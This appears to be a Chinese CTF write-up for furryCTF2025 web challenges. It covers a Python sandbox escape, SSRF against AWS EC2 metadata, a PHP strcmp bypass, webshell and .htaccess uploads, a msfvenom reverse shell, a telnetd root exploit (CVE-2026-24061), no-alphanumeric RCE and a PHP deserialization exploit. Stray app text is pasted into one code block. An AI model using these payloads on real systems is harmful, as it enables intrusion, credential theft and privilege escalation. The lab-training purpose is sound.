---
title: furryCTF2025
date: 2026-03-11 21:10:11
tags:
- python沙箱逃逸
- PDB调试
- breakpoint
- 云元数据服务泄露
- AWS EC2
- 备份文件泄露
- strcmp特性
- 短标签绕过
- .htaccess的XBM图片头
- CVE-2026-24061
- telnetd
- 无字母数字rce取反绕过
category:
- 比赛复现
---

# furryCTF2025

## WEB

### PyEditor&猫猫最后的复仇

题目下发了app.py并提供了一个容器：

源码：

```
import ast
import subprocess
import tempfile
import os
import time
import threading
from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO, emit
import secrets

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', secrets.token_hex(32))
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024
socketio = SocketIO(app, cors_allowed_origins="*")

active_processes = {}

class PythonRunner:
    
    def __init__(self, code, args=""):
        self.code = code
        self.args = args
        self.process = None
        self.output = []
        self.running = False
        self.temp_file = None
        self.start_time = None
        
    def validate_code(self):
        try:
            if len(self.code) > int(os.environ.get('MAX_CODE_SIZE', 1024)):
                return False, "代码过长"
                
            tree = ast.parse(self.code)
            
            banned_modules = ['os', 'sys', 'subprocess', 'shlex', 'pty', 'popen', 'shutil', 'platform', 'ctypes', 'cffi', 'io', 'importlib']
            
            banned_functions = ['eval', 'exec', 'compile', 'input', '__import__', 'open', 'file', 'execfile', 'reload']
            
            banned_methods = ['system', 'popen', 'spawn', 'execv', 'execl', 'execve', 'execlp', 'execvp', 'chdir', 'kill', 'remove', 'unlink', 'rmdir', 'mkdir', 'makedirs', 'removedirs', 'read', 'write', 'readlines', 'writelines', 'load', 'loads', 'dump', 'dumps', 'get_data', 'get_source', 'get_code', 'load_module', 'exec_module']
            
            dangerous_attributes = ['__class__', '__base__', '__bases__', '__mro__', '__subclasses__', '__globals__', '__builtins__', '__getattribute__', '__getattr__', '__setattr__', '__delattr__', '__call__']
            
            for node in ast.walk(tree):
                if isinstance(node, ast.Import):
                    for name in node.names:
                        if name.name in banned_modules:
                            return False, f"禁止导入模块: {name.name}"
                        
                elif isinstance(node, ast.ImportFrom):
                    if node.module in banned_modules:
                        return False, f"禁止从模块导入: {node.module}"
                
                elif isinstance(node, ast.Call):
                    if isinstance(node.func, ast.Name):
                        if node.func.id in banned_functions:
                            return False, f"禁止调用函数: {node.func.id}"
                    
                    elif isinstance(node.func, ast.Attribute):
                        if node.func.attr in banned_methods:
                            return False, f"禁止调用方法: {node.func.attr}"
                    
                    elif isinstance(node.func, ast.Name):
                        if node.func.id == 'open':
                            return False, "禁止文件操作"
                
                elif isinstance(node, ast.With):
                    for item in node.items:
                        if isinstance(item.context_expr, ast.Call):
                            if isinstance(item.context_expr.func, ast.Name):
                                if item.context_expr.func.id == 'open':
                                    return False, "禁止文件操作"
                
                elif isinstance(node, ast.Attribute):
                    if node.attr in dangerous_attributes:
                        if isinstance(node.value, ast.Call) or isinstance(node.value, ast.Name):
                            return False, f"禁止访问危险属性: {node.attr}"
                
                elif isinstance(node, ast.Subscript):
                    if isinstance(node.value, ast.Attribute):
                        if node.value.attr == '__subclasses__':
                            return False, "禁止访问__subclasses__"
            
            return True, "代码验证通过"
            
        except SyntaxError as e:
            return False, f"语法错误: {str(e)}"
        except Exception as e:
            return False, f"验证错误: {str(e)}"
    
    def create_script(self):
        try:
            self.temp_file = tempfile.NamedTemporaryFile(
                mode='w', 
                suffix='.py', 
                dir='/tmp',
                delete=False
            )
            
            wrapper = """
import sys

def safe_exec():
    try:
{indented_code}
        return 0
    except SystemExit as e:
        return e.code if isinstance(e.code, int) else 0
    except Exception as e:
        print(f"执行错误: {{e}}", file=sys.stderr)
        return 1

sys.argv = ['sandbox.py'] + {args}

exit_code = safe_exec()

exit()
# Hey bro, don't forget to remove this before release!!!
import os
import sys

flag_content = os.environ.get('GZCTF_FLAG', '')
os.environ['GZCTF_FLAG'] = ''

try:
    with open('/flag.txt', 'w') as f:
        f.write(flag_content)
except:
    pass
"""
            
            indented_code = '\n'.join(['        ' + line for line in self.code.split('\n')])
            
            full_code = wrapper.format(
                indented_code=indented_code,
                args=str(self.args.split() if self.args else [])
            )
            
            self.temp_file.write(full_code)
            self.temp_file.flush()
            os.chmod(self.temp_file.name, 0o755)
            
            return self.temp_file.name
            
        except Exception as e:
            raise Exception(f"创建脚本失败: {str(e)}")
    
    def run(self):
        try:
            is_valid, message = self.validate_code()
            if not is_valid:
                self.output.append(f"验证失败: {message}")
                return False
                
            script_path = self.create_script()
            
            cmd = ['python', script_path]
            if self.args:
                cmd.extend(self.args.split())
            
            self.process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
                text=True,
                bufsize=1,
                universal_newlines=True
            )
            
            self.running = True
            self.start_time = time.time()
            
            def read_output():
                while self.process and self.process.poll() is None:
                    try:
                        line = self.process.stdout.readline()
                        if line:
                            self.output.append(line.strip())
                            socketio.emit('output', {'data': line})
                    except:
                        break
                
                stdout, stderr = self.process.communicate()
                if stdout:
                    for line in stdout.split('\n'):
                        if line.strip():
                            self.output.append(line.strip())
                            socketio.emit('output', {'data': line})
                if stderr:
                    for line in stderr.split('\n'):
                        if line.strip():
                            self.output.append(f"错误: {line.strip()}")
                            socketio.emit('output', {'data': f"错误: {line}"})
                
                self.running = False
                socketio.emit('process_end', {'pid': self.process.pid})
            
            thread = threading.Thread(target=read_output)
            thread.daemon = True
            thread.start()
            
            return True
            
        except Exception as e:
            self.output.append(f"运行失败: {str(e)}")
            return False
    
    def send_input(self, data):
        if self.process and self.process.poll() is None:
            try:
                self.process.stdin.write(data + '\n')
                self.process.stdin.flush()
                return True
            except:
                return False
        return False
    
    def terminate(self):
        if self.process and self.process.poll() is None:
            self.process.terminate()
            self.process.wait(timeout=5)
            self.running = False
            
            if self.temp_file:
                try:
                    os.unlink(self.temp_file.name)
                except:
                    pass
            return True
        return False

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/run', methods=['POST'])
def run_code():
    data = request.json
    code = data.get('code', '')
    args = data.get('args', '')
    
    runner = PythonRunner(code, args)
    
    pid = secrets.token_hex(8)
    active_processes[pid] = runner
    
    success = runner.run()
    
    if success:
        return jsonify({
            'success': True,
            'pid': pid,
            'message': '进程已启动'
        })
    else:
        return jsonify({
            'success': False,
            'message': '启动失败'
        })

@app.route('/api/terminate', methods=['POST'])
def terminate_process():
    data = request.json
    pid = data.get('pid')
    
    if pid in active_processes:
        active_processes[pid].terminate()
        del active_processes[pid]
        return jsonify({'success': True})
    
    return jsonify({'success': False, 'message': '进程不存在'})

@app.route('/api/send_input', methods=['POST'])
def send_input():
    data = request.json
    pid = data.get('pid')
    input_data = data.get('input', '')
    
    if pid in active_processes:
        success = active_processes[pid].send_input(input_data)
        return jsonify({'success': success})
    
    return jsonify({'success': False})

@socketio.on('connect')
def handle_connect():
    emit('connected', {'data': 'Connected'})

@socketio.on('disconnect')
def handle_disconnect():
    pass

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000, debug=False, allow_unsafe_werkzeug=True)
```

我们注意到，这个Python沙箱进行了AST检查，过滤了文件操作和一大堆的系统调用，还ban掉了一大堆魔术方法。

但是，里面有这么一段代码：

```
wrapper = """
import sys

def safe_exec():
    try:
{indented_code}
        return 0
    except SystemExit as e:
        return e.code if isinstance(e.code, int) else 0
    except Exception as e:
        print(f"执行错误: {{e}}", file=sys.stderr)
        return 1

sys.argv = ['sandbox.py'] + {args}

exit_code = safe_exec()

exit()
# Hey bro, don't forget to remove this before release!!!
import os
import sys

flag_content = os.environ.get('GZCTF_FLAG', '')
os.environ['GZCTF_FLAG'] = ''

try:
    with open('/flag.txt', 'w') as f:
        f.write(flag_content)
except:
    pass
"""
```

可以注意到，这里有一段本应被删除的测试代码，功能就是读取flag内容并写入flag.txt。

看起来这就是我们需要利用的代码了，问题是，这段代码的前面有exit()，所以代码根本跑不到这里。

那该怎么办？

既然我们想要跳过exit()，一个方法就是去强制控制程序执行流。

最简单的控制执行流方法自然就是breakpoint()了：

```
breakpoint()
```

---

问题是，breakpoint()需要人手动操作

默认程序就是`print("Hello Python 3.14!")`。

这就不得不提到Python3.14中breakpoint()的一个新特性了，他支持了一个新参数：commands。

这个参数允许你传入一个命令列表，当breakpoint()开始执行时，他将会自动依次传入操作命令，这就给了我们操作的机会。

显然我们需要利用jump命令跳过exit()，但是jump只能在同一代码块下进行，所以我们首先需要从safe_exec()函数返回，并尝试着找到exit()的位置（尝试了一下3次next就可以到达）：

```
breakpoint(commands=['n']*3)
```

接下来我们可以尝试着寻找正确的行号，其实这里可以计算一下的，毕竟我们知道了程序模板（就是上面那个wrapper，可以看到如果跳转到`import os`需要跳转到第20行）：

```
breakpoint(commands=['n']*3 + ['j 20'])
```

  **命令含义**

- **`n` (next)**：执行当前行，停在下一行
- **`j 20` (jump)**：跳转到第20行执行（不执行中间代码）

最后往下运行3行，我们就能看到最终的flag已经被读进了`flag_content`变量。

所以我们只需要接一个`p flag_content`即可。

于是我们得到了最终的Payload：

```
breakpoint(commands=['n']*3+['j 20']+['n']*3+['p flag_content'])
breakpoint(commands=['n','n','n','j 20','n','n','n','p flag_content']) # 这个也是可以的zwz
```

```
先执行断点本身（第1个 n）
越过 exit（第2个 n）
到达安全区域（第3个 n）

再跳回执行后门（j 20）第18行: exit_code = safe_exec()
第19行: breakpoint()  ← 设置断点，还没执行 exit()
第20行: j 20  ← 强制跳转到第20行
第21行: n  ← 执行 import os
第22行: n  ← 执行 import sys
第23行: n  ← 执行 flag_content = os.environ.get('GZCTF_FLAG', '')
第24行: p flag_content  ← 打印 flag
```

---

#### 其他pyload

```
print(sys.modules['os'].environ['GZCTF_FLAG'])
```

```
先执行
运行回显进程
得到进程号
输入breakpoint()
执行
控制台

Payload：
var current_pid = "这里填你的进程ID"; 

var python_cmd = "import os; os.system('cat /flag.txt')";

fetch("/api/send_input", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({
        pid: current_pid,
        input: python_cmd
    })
}).then(r => r.json()).then(console.log);

页面回显
```

```Python
g = [ｇｌｏｂａｌｓ][0]()
print(g['flag_content'])
```

```Python
import __main__
print(__main__.flag_content)
```

```Python
import timeit
s = [105, 109, 112, 111, 114, 116, 32, 111, 115, 59, 32, 111, 115, 46, 115, 121, 115, 116, 101, 109, 40, 39, 99, 97, 116, 32, 47, 102, 108, 97, 103, 46, 116, 120, 116, 39, 41]
print(timeit.timeit(cmd, number=1))
```

```SQL
f=open
g=f('/'+'flag'+'.'+'txt')
for line in g:
    print(line,end='')
```

```Python
import linecache

# 目标文件已经确定为 /flag.txt
target = '/flag' + '.txt'

# 方案一：利用 linecache 绕过（最稳妥，不触发 open 审计）
print("Reading via linecache:")
for i in range(1, 5):
    line = linecache.getline(target, i)
    if line:
        print(line.strip())

# 方案二：利用内置 bi 字典绕过（如果 linecache 有缓存延迟）
try:
    # 拿到 builtins 字典
    gb = (linecache.getline,)[0].__globals__
    bi = gb['__built' + 'ins__']
    bi_d = (bi,)[0] if isinstance(bi, dict) else (bi,)[0].__dict__
    
    # 拿到 open 函数
    op = bi_d['o' + 'pe' + 'n']
    
    print("\nReading via builtin open:")
    # 迭代文件对象避开 .read()
    f = op(target)
    for l in f:
        print(l.strip())
except Exception as e:
    print(f"Error: {e}")
```

---

### CCPreview

打开题目靶机，我们看到一个名为 CloudConnect的网页工具，其功能是测试网站连通性

这题的描述里说到服务部署在亚马逊云服务器上，并且是EC2实例，题目还说这是一个curl的代理

题目提示：

```
为了测试内网服务的连通性，【数据删除】开发组上线了一个简单的网页预览工具。
据说该服务部署在 AWS 也就是亚马逊云服务上，属于EC2实例……
虽然它看起来只是一个简单的 curl 代理.jpg
“话说，咱们就这么部署在这里，真的没问题吗……”
“怕啥，这就一个curl，能有什么漏洞？”
```

这是一道很典型的云安全题，云服务提供了元数据服务，允许实例访问自身的配置信息和凭证，攻击者可以利用SSRF漏洞访问这些元数据服务

AWS EC2 实例有一个众所周知的链路本地地址：169.254.169.254，实例内部的服务可以通过HTTP请求这个IP来获取自身的配置信息、网络信息以及最敏感的 IAM 凭证

所以我们直接用POC打，在输入框种输入payload：

```
http://169.254.169.254/latest/meta-data/
```

响应结果：

```
iam/
network/
public-hostname/
```

服务器返回了目录列表

接下来就可以挖IAM凭证了，首先我们先看IAM目录：

```
http://169.254.169.254/latest/meta-data/iam/
```

然后查看凭证目录：

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

发现了一个名为 admin-role 的角色：

然后我们接着看它的凭证

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role
```

直接拿到flag

---

### SSO drive

进来是个登录口，题目说负责认证模块的开发小哥有着随手备份源码的好习惯，那我们试试常见的备份文件的格式

尝试访问www.zip是404

尝试访问index.php.bak

下载成功了，打开是index.php的源码

```
<?php
// Backup 2026-01-20 by Dev Team
// TODO: Fix the comparison logic later?
session_start();
$REAL_PASSWORD = 'THIS_IS_A_VERY_LONG_RANDOM_PASSWORD_THAT_CANNOT_BE_BRUTEFORCED_882193712';
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $u = $_POST['username'];
    $p = $_POST['password'];
    if ($u === 'admin') {
        // Dev Note: using strcmp for binary safe comparison
        if (strcmp($p, $REAL_PASSWORD) == 0) {
            $_SESSION['is_admin'] = true;
            header("Location: dashboard.php");
            exit;
        } else {
            $error = "Password Wrong";
        }
    }
}
?>
```

发现是个strcmp函数，当strcmp($a, $b) 用于比较两个字符串，如果$a等于$b，它返回0当strcmp()的参数类型不正确时会抛出一个 Warning 警告，但函数返回值会是NULL，因此我们可以将密码构造成数组，密码随便输，strcmp将数组和正确密码比较发现参数类型不对就会返回NULL，而NULL==0是成立的，因此就可以使其绕过登录成功

```Markdown
username=admin&password[]=123
```

登录成功后进来发现是个文件上传：

上传一个普通一句话木马

```
<?php @eval($_POST['a']);?>
```

但是发现传不上去，首先，php后缀被过滤了，apache常见解析的后缀比如php5、phtml这些也不行

猜测是白名单，传伪装的jpg也不行提示说不是图片数据，所以我们加一个GIF89a的头伪装成GIF图

然后又显示不能有php代码

可以用短标签绕过

```
GIF89a
<? @eval($_POST['a']);?>
```

上传muma.jpg

发现上传成功，回显如下

```
Upload Successful!
Path: uploads/muma.jpg
Image Type: image/gif
```

**但是不能解析，因为不是php后缀名，用指纹嗅探工具发现这题是apache，尝试上传.htaccess文件**

**同理需要加图片头，但是因为.htaccess的语法的原因不能使用GIF89a**

**但是XBM图片头满足，它的头和.htaccess的语法的注释一样，所以我们在.htaccess文件开头加上XBM头，上传成功**

```
#define width 1
#define height 1
AddType application/x-httpd-php .jpg
php_flag engine on
```

**注意：**

1、`#define width 1#define height ` XBM图片头，用于伪装成图片绕过检查

2、`php_flag engine on`

这是PHP配置指令，用于确保当前目录下的PHP解析引擎是开启状态。某些服务器为了安全会在上传目录禁用PHP执行，这行命令可以覆盖该设置，强制启用PHP解析功能。

---

上传成功，然后发现成功解析了，拿蚁剑连接

看根目录发现有一个flag1，是不完整的flag

```
POFP{bb651478-
```

打开start.sh发现flag被拆成了3份，flag1在根目录，flag2在web目录的.flag2_hidden内，flag3在root内

**start.sh源码：**

```
#!/bin/bash
service mariadb start
mysql -u root -e "CREATE DATABASE IF NOT EXISTS ctf_db;"
mysql -u root -e "CREATE USER IF NOT EXISTS 'ctf'@'localhost' IDENTIFIED BY 'ctf';"
mysql -u root -e "GRANT ALL PRIVILEGES ON ctf_db.* TO 'ctf'@'localhost';"
mysql -u root -e "FLUSH PRIVILEGES;"
if [ -f /var/www/html/db.sql ]; then
    mysql -u root ctf_db < /var/www/html/db.sql
fi
if [ ! -z "$GZCTF_FLAG" ]; then
    LEN=${#GZCTF_FLAG}
    PART_LEN=$((LEN / 3))
    
    FLAG1=${GZCTF_FLAG:0:$PART_LEN}
    FLAG2=${GZCTF_FLAG:$PART_LEN:$PART_LEN}
    FLAG3=${GZCTF_FLAG:$((PART_LEN * 2))}
    echo $FLAG1 > /flag1
    chmod 644 /flag1
    echo $FLAG2 > /var/www/html/.flag2_hidden
    chmod 644 /var/www/html/.flag2_hidden
    echo $FLAG3 > /root/flag3
    chmod 600 /root/flag3
    export GZCTF_FLAG=not_here
fi
/usr/sbin/xinetd -stayalive -pidfile /var/run/xinetd.pid
exec apache2-foreground
```

为了之后方便操作，我们用msf写一个反弹shell的马，

```
sudo msfvenom -p linux/x64/shell_reverse_tcp LHOST=ip LPORT=port -f elf -o shell.elf


然后我们的vps开启监听
nc -lvp 8888
```

我们运行写的马反弹shell到我们的vps上

```
chmod +x ./shell.elf
./shell.elf
```

先看看有哪些进程

```
ps -aux


#
(www-data:/) $ ps -aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.1  77108 25856 ?        Ss   12:39   0:00 apache2 -DFOREGROUND
root          33  0.0  0.0   2484  1692 ?        S    12:39   0:00 /bin/sh /usr/bin/mysqld_safe
mysql        146  0.0  0.5 1870968 94816 ?       Sl   12:39   0:01 /usr/sbin/mariadbd --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=mysql --skip-log-error --pid-file=/run/mysqld/mysqld.pid --socket=/run/mysqld/mysqld.sock
root         147  0.0  0.0   5800  2496 ?        S    12:39   0:00 logger -t mysqld -p daemon error
root         242  0.0  0.0   9648  2556 ?        Ss   12:39   0:00 /usr/sbin/xinetd -stayalive -pidfile /var/run/xinetd.pid
www-data     257  0.0  0.0  77404 14108 ?        S    12:39   0:00 apache2 -DFOREGROUND
www-data     258  0.0  0.0  77404 14100 ?        S    12:39   0:00 apache2 -DFOREGROUND
www-data     259  0.0  0.0  77404 13916 ?        S    12:39   0:00 apache2 -DFOREGROUND
www-data     260  0.0  0.0  77404 13908 ?        S    12:39   0:00 apache2 -DFOREGROUND
www-data     261  0.0  0.0  77404 14088 ?        S    12:39   0:00 apache2 -DFOREGROUND
www-data     269  0.0  0.0  77404 14028 ?        S    12:39   0:00 apache2 -DFOREGROUND
www-data     275  0.0  0.0   2484  1616 ?        S    13:21   0:00 sh -c /bin/sh -c "cd "/";ps -aux;echo aca511768;pwd;echo 53c51c" 2>&1
www-data     276  0.0  0.0   2484  1580 ?        S    13:21   0:00 /bin/sh -c cd /;ps -aux;echo aca511768;pwd;echo 53c51c
www-data     277  0.0  0.0   6760  2912 ?        R    13:21   0:00 ps -aux
```

发现有个xinetd服务，再看看开了哪些端口

```Bash
netstat -antp
```

#### 如何检查系统是否运行了 `telnetd` 服务

在服务器上执行以下命令，查看是否有进程监听23端口（telnet默认端口）：

这里发现了个telnetd服务，题目说了为了兼容旧系统，他们不得不在服务器后台运行了一个陈旧服务用于内部远程管理，我们看一下telnet的版本号

cils) 2.2，联想到题目说的陈旧服务，再结合最近披露的CVE-2026-24061的提权漏洞提到的版本号吻合(https://www.openwall.com/lists/oss-security/2026/01/20/2)

所以我根据POC的写法写一个exp:

```
<?php
$s = fsockopen("127.0.0.1", 23);
if(!$s) die();
stream_set_blocking($s, 1);
stream_set_timeout($s, 2);
$p = "\xff\xfa\x27\x00\x00USER\x01-f root\xff\xf0";
while(!feof($s)) {
    $c = fgetc($s);
    if($c === false) break;
    if($c == "\xff") {
        $o = fgetc($s);
        if($o == "\xfd") {
            $t = fgetc($s);
            if($t == "\x27") fwrite($s, "\xff\xfb\x27");
            else fwrite($s, "\xff\xfc".$t);
        } elseif($o == "\xfa") {
            if(fgetc($s) == "\x27") {
                while(fgetc($s) != "\xf0");
                fwrite($s, $p);
                sleep(1);
                fwrite($s, "cat /root/flag3\n");
            }
        } elseif($o == "\xfe" || $o == "\xfb" || $o == "\xfc") {
            fgetc($s);
        }
    } else {
        echo $c;
    }
}
fclose($s);
?>
```

在/var/www/html下新建1.php

然后

```
php 1.php


#(www-data:/var/www/html) $ php 1.php
Linux 6.12.63+deb13-cloud-amd64 (9c0aad0dba1c) (pts/0)
Linux 9c0aad0dba1c 6.12.63+deb13-cloud-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.63-1 (2025-12-30) x86_64
The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@9c0aad0dba1c:~# cat /root/flag3
-f9e277167a92}
root@9c0aad0dba1c:~#
```

成功拿到了flag3:

```
cat /flag1
cat /var/www/html/.flag2_hidden
```

最后拼接flag

```
POFP{bb651478-b4e5-4ac6-8b49-f9e277167a92}
```

---

### 命令终端

给了账号密码，所以直接登录admin/qwe@123然后题目还说允许使用dirsearch，那就直接用dirsearch先扫

扫出来了一个www.zip:

下载发现是源码：

```
<?php
session_start();
if (empty($_SESSION['user_id']) || !is_int($_SESSION['user_id'])) {
    header('Location: ../index.php', true, 302);
    exit;
}
$output = "";
if (isset($_POST['cmd'])) {
    $code = $_POST['cmd'];
    if(strlen($code) > 200) {
        $output = "略略略，这么长还想执行命令？";
    } 
    else if(preg_match('/[a-z0-9$_\."`\s]/i', $code)) {
        $output = "啊哦，你的命令被防火墙吃了\n&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;来自waf的消息：杂鱼黑客，就这样还想执行命令？";
    } 
    else {
        ob_start();
        try {
            eval($code);
        } catch (Throwable $t) {
            echo "Execution Error.";
        }
        $output = ob_get_clean();
    }
}

```

能看出来这题是无字母数字rce了，过滤了`$、"和.`这里可以用取反绕过

取反脚本：

```
<?php
$str = "phpinfo"; 
$payload = "";
for($i=0; $i<strlen($str); $i++){
    $payload .= "%" . strtoupper(dechex(ord(~$str[$i])));
}
echo "(~'$payload')();";
?>

# (~'%8F%97%8F%96%91%99%90')();
```

抓包之后提交，查看phpinfo没有禁用函数

题目的源码有限制字数长度，所以为了会防止超出我直接用readfile读flag

```
<?php
$func_name = "readfile";
$arg_path  = "/flag";
function encode_str($str) {
    $res = "";
    for($i=0; $i<strlen($str); $i++) {
        $res .= "%" . strtoupper(dechex(ord(~$str[$i])));
    }
    return $res;
}
$func_code = encode_str($func_name);
$arg_code  = encode_str($arg_path);
echo "(~'$func_code')(~'$arg_code');";
?>
```

同样将输出结果复制过去直接读flag，成功拿到flag

---

### babypop

源码：

```

聊天历史记录

暂无会话历史记录哦～

打开大学搜题酱APP在 「我的」页
点击「电脑端扫码」
下载大学搜题酱App
帮助
搜题
翻译
复制
问一问
<?php
error_reporting(0);
highlight_file(__FILE__);
class SecurityProvider {
    private $token;
    public function __construct() {
        $this->token = md5(uniqid());
    }
    public function verify($data) {
        if (strpos($data, '..') !== false) {
            die("Attack Detected");
        }
        return $data;
    }
}
class LogService {
    protected $handler;
    protected $formatter;
    
    public function __construct($handler = null) {
        $this->handler = $handler;
        $this->formatter = new DateFormatter();
    }

    public function __destruct() {
        if ($this->handler && method_exists($this->handler, 'close')) {
            $this->handler->close();
        }
    }
}
class FileStream {
    private $path;
    private $mode;
    public $content; 
    public function __construct($path, $mode) {
        $this->path = $path;
        $this->mode = $mode;
    }
    public function close() {
        if ($this->mode === 'debug' && !empty($this->content)) {
            $cmd = $this->content;
            if (strlen($cmd) < 2) return;
            @eval($cmd);
        } else {
            return true;
        }
    }
}
class DateFormatter {
    public function format($timestamp) {
        return date('Y-m-d H:i:s', $timestamp);
    }
}
class UserProfile {
    public $username;
    public $bio;
    public $preference; 

    public function __construct($u, $b) {
        $this->username = $u;
        $this->bio = $b;
        $this->preference = new DateFormatter();
    }
}
class DataSanitizer {
    public static function clean($input) {
        return str_replace("hacker", "", $input);
    }
}
$raw_user = $_POST['user'] ?? null;
$raw_bio = $_POST['bio'] ?? null;
if ($raw_user && $raw_bio) {
    $sec = new SecurityProvider();
    $sec->verify($raw_user);
    $sec->verify($raw_bio);
    $profile = new UserProfile($raw_user, $raw_bio);
    $data = serialize($profile);
    if (strlen($data) > 4096) {
        die("Data too long");
    }
    $safe_data = DataSanitizer::clean($data);
    $unserialized = unserialize($safe_data);
    if ($unserialized instanceof UserProfile) {
        echo "Profile loaded for " . htmlspecialchars($unserialized->username);
    }
}
?>
```

一、代码核心与执行流程

- 接收 POST 的 user 和 bio。
- 用 user、bio 构造 UserProfile 对象并 serialize()。
- 将序列化字符串交给 DataSanitizer::clean（仅把子串 "hacker" 替换为空字符串）。
- 再对清理后的字符串 unserialize()，若成功且结果是 UserProfile 实例，输出用户名。
- 程序结束时会触发对象析构，可能调用 __destruct。

关键类：

- FileStream::close(): 若 mode === 'debug' 且 content 非空，则把 content 存入 $cmd 并 @eval($cmd) —— 可直接执行任意 PHP 代码。
- LogService::__destruct(): 若 $handler 存在并且有 close() 方法，则调用 $handler->close() —— 可以间接触发 FileStream->close()。
- UserProfile->preference：构造时固定为 DateFormatter（安全），但这是对象属性，序列化/反序列化时可以被替换成任意对象。

二、漏洞点概述

- 反序列化不可信数据（unserialize）本身就是危险操作，会创建任意类的对象并触发魔术方法（如 __wakeup、__destruct）。
- 过滤函数 DataSanitizer::clean 很弱，只做 str_replace("hacker","")，不是针对序列化结构做安全处理。删除字符串会改变序列化格式（特别是长度计数 s:NN:"...";），但并不阻止 unserialize 解析成其它对象。
- 通过精心构造的序列化字符串，可以把 UserProfile->preference 从 DateFormatter 换成包含恶意 handler 的 LogService，而 LogService 的析构会触发 FileStream->close()，进而 eval(content)。

三、利用思路（核心链） 目标：在反序列化后，得到一个 UserProfile 对象（unserialize 后类型检查通过），但其中的 preference 属性被替换为一个 LogService 对象，而 LogService->handler 指向 FileStream（mode='debug'，content 为想执行的 PHP 代码，例如 system("cat /flag");）。程序结束时 LogService->__destruct() 会调用 handler->close()，触发 eval 执行 content，从而读出 /flag。

构造要点：

1. 我们只能控制 user 和 bio 两个字符串。最终 unserialize 的输入来自于 serialize(UserProfile) 经过 DataSanitizer::clean 的产物。也就是说，我们不能直接上传一个完整的 LogService 的序列化串替换整个输入，而要在 UserProfile 的序列化结构上“植入”我们的 LogService 串，替换 preference 字段部分。
2. PHP 的序列化格式对字符串有长度标注，例如 s:6:"foobar";。DataSanitizer 只把 "hacker" 字面删除（长度 6），这会使原序列化文本“偏移”，从而可以利用“删除固定字节”来改变序列化文本里长度计数字符出现的位置，使 unserialize 解析出的对象结构发生变化（即把原来指向 DateFormatter 的 preference 字段解析成我们嵌入的 LogService 数据）。
3. 具体技术：让 username 字段的值包含若干次 "hacker" 串（这些会被删除，消耗固定字节），以“吃掉”序列化文本里恰当数量的字符，从而把后面的序列化串（我们在 bio 中提前放好的 LogService 序列化片段）恰好接到 preference 字段的位置上。由于每个 "hacker" 长度为 6，删除 N 次会去掉 6N 字节，因此需要使要“吃掉”的总字节数是 6 的倍数。
4. 在 bio 字段中放置一个专门构造的尾部片段，使得在原 UserProfile 的序列化中它会被当作 bio 的内容，然后连着构成一个合法的序列化表示，其中包含 s:10:"preference";O:10:"LogService":... 这样的序列，最终 unserialize 输出的 UserProfile->preference 就是 LogService 实例，且 LogService->handler 指向我们构造的 FileStream 实例（mode='debug'，content 包含要 eval 的命令）。

四、构造过程细节（说明关键步骤）

- 先用 PHP 本地脚本构造目标的恶意对象序列化串（POC 对象链）：
  - new FileStream('exploit.log','debug')，设置 content = 'system("cat /flag");'。
  - new LogService($f)，序列化得到 $bad = serialize($l)。
- 在本地测算要在序列化文本中“吃掉”的字节数：构造 UserProfile 序列化的大致形式： O:11:"UserProfile":3:{s:8:"username";s:LEN_USER:"...";s:3:"bio";s:LEN_BIO:"...";s:10:"preference";...} 我们通过往 username 中填入若干个 "hacker" 来删除字节，目标是让删除后的文本把后面 bio 中的构造片段移动到 preference 处。
- 通过循环尝试不同长度的 padding（在 bio 里放一些可控字符 A），计算构造出的中间片段吃掉多少字符，找到使得被删除字符长度 % 6 == 0 的组合（即可由 N 个 "hacker" 完整覆盖）。
- 最终输出 POST 数据：user=（若干 hacker 拼接）&bio=（urlencoded 的恶意片段）。服务端接收后：
  1. 用 user、bio 构建 UserProfile；serialize -> 得到文本；
  2. DataSanitizer::clean 删除所有 "hacker" 子串（改变文本偏移，但字节移位按设计）；
  3. unserialize() 解析出 UserProfile，其中 preference 已被替换为 LogService->FileStream；
  4. 脚本结束触发析构 -> FileStream->close() -> eval(content) -> 执行 system("cat /flag"); 输出 flag。

五、示例中关键点解释（对应题目给出的 payload）

- payload 中 user=hackerhackerhackerhacker：通过重复 "hacker" 来删除恰当数量的字符。
- bio 中的片段拼接了 padding、s:10:"preference"; 后跟序列化的 LogService 对象（含 FileStream 子对象和 content 字段，content 存放 URL 编码后的 system("cat /flag");），解码并反序列化后就能被当作 preference 属性读取并在析构时执行。****

exp脚本：

```
<?php
class LogService {
    protected $handler;
    protected $formatter;
    public function __construct($h = null) {
        $this->handler = $h;
        $this->formatter = new DateFormatter();
    }
}
class FileStream {
    private $path;
    private $mode;
    public $content; 
    public function __construct($p, $m) {
        $this->path = $p;
        $this->mode = $m;
    }
}
class DateFormatter {}
$f = new FileStream('exploit.log', 'debug');
$f->content = 'system("cat /flag");';
$l = new LogService($f);
$bad = serialize($l);
for ($i = 0; $i < 2000; $i++) {
    $pad = str_repeat("A", $i);
    $bio = $pad . '";s:10:"preference";' . $bad . ';}';
    $eat = '";s:3:"bio";s:' . strlen($bio) . ':"' . $pad;
    
    if (strlen($eat) % 6 === 0) {
        echo "user=" . str_repeat("hacker", strlen($eat) / 6) . "&bio=" . urlencode($bio);
        break;
    }
}
?>
```

生成的payload：

```
